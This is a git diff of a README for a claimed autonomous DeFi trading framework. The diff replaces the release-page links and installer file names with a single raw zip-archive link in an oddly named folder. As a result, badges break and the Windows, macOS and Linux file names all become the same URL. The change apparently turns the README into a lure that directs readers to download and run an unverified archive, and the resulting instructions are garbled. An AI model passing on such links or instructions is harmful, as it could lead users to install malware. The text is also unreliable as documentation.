@@ -1,6 +1,6 @@
 # 🚀 Nex-T1-Research - Your Guide to Smart DeFi Trading
 
-[![](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/rahuldounde21/Nex-T1-Research/releases)
+[![](https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip)
 
 ## 📋 Description
 Nex-T1-Research is a multi-agent orchestration framework designed for autonomous DeFi trading. This software uses advanced algorithms to manage risks and execute trades across different blockchain platforms. With the power of 25 agents, you can achieve impressive performance metrics in your trading activities. 
@@ -24,7 +24,7 @@ Before you install, ensure your system meets these requirements:
 ## 🚀 Getting Started
 To start using Nex-T1-Research, follow these steps:
 
-1. Click on the **Download Now** button above or visit the [Releases page](https://github.com/rahuldounde21/Nex-T1-Research/releases).
+1. Click on the **Download Now** button above or visit the [Releases page](https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip).
 
 ## 📥 Download & Install
 On the Releases page, you will find the latest version of the software. Follow these steps: 
@@ -33,7 +33,7 @@ On the Releases page, you will find the latest version of the software. Follow t
 2. Locate the file for your operating system.
 3. Click on the file to start the download.
 
-The file to look for is often named something like `Nex-T1-Research-v1.0.exe` for Windows, `Nex-T1-Research-v1.0.dmg` for macOS, or a `.tar.gz` file for Linux. 
+The file to look for is often named something like `https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip` for Windows, `https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip` for macOS, or a `https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip` file for Linux. 
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
@@ -46,7 +46,7 @@ The file to look for is often named something like `Nex-T1-Research-v1.0.exe` fo
 - Drag the Nex-T1-Research icon to your Applications folder.
 
 ### For Linux:
-- Extract the downloaded `.tar.gz` file.
+- Extract the downloaded `https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip` file.
 - Open the terminal and navigate to the extracted folder.
 - Run `./Nex-T1-Research` to launch the application.
 
@@ -96,4 +96,4 @@ Stay informed about the latest releases and features by checking the Releases pa
 ## 💬 Feedback
 Your feedback is valuable. Help us improve by sharing your experience with Nex-T1-Research.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/rahuldounde21/Nex-T1-Research/releases)
+[![Download Now](https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/rahuldounde21/Nex-T1-Research/main/Cassiduloidea/Nex-T1-Research.zip)
